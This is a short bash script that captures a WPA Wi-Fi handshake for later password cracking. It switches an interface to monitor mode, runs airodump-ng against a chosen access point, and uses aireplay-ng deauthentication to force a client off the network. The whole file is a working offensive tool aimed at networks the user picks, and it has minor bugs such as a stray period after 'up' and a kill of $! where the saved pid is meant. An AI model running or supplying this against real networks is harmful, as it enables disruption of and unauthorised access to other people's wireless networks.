#!/bin/bash

# Use this script to capture a wpa-handshake file to be
# cracked later.

# places the specified interface into monitor mode
monitor_mode() {
	echo "[+] Putting $1 into monitor mode..."
	
	ifconfig $1 down
	iwconfig $1 mode monitor
	ifconfig $1 up

	echo "[+] Killing NetworkManager"
	systemctl stop NetworkManager
}

# captures the handshake of a specified wpa network
get_handshake() {
	airodump-ng $1

	echo -e "\nEnter the BSSID of the target network: "
	read bssid

	echo -e "\nEnter the channel of the target network: "
	read channel

	konsole --hold -e "airodump-ng -c $channel --bssid $bssid -w ./captured_key --output-format cap $1" &> /dev/null &
	pid=$!

	echo "Enter the mac of the client to boot: "
	read client

	echo -e "\n[+] Deauthing $client..."
	aireplay-ng --deauth 4 -a $bssid $1

	echo -e "\nPress ENTER to continue begin exit process"
	read

	kill $!
}

# puts the interface back into managed mode
revert_interface() {
	echo "[+] Putting $1 back into managed mode..."

	ifconfig $1 down
	iwconfig $1 mode managed
	ifconfig $1 up.

	systemctl start NetworkManager
}

# forces script to be run as root
if [[ $EUID -ne 0 ]]; then
    echo "[-] This script must be run as root."
    echo "[-] Exiting..." 
    exit 1
fi

if [ $# -ne 1 ]; then
	echo "[-] Interface not specified."
	echo "	Usage: ./grab_wpa_handshake.sh <interface name>"
	echo "[-] Exiting..."
	exit 1
fi

iface=$1

monitor_mode $iface
get_handshake $iface
revert_interface $iface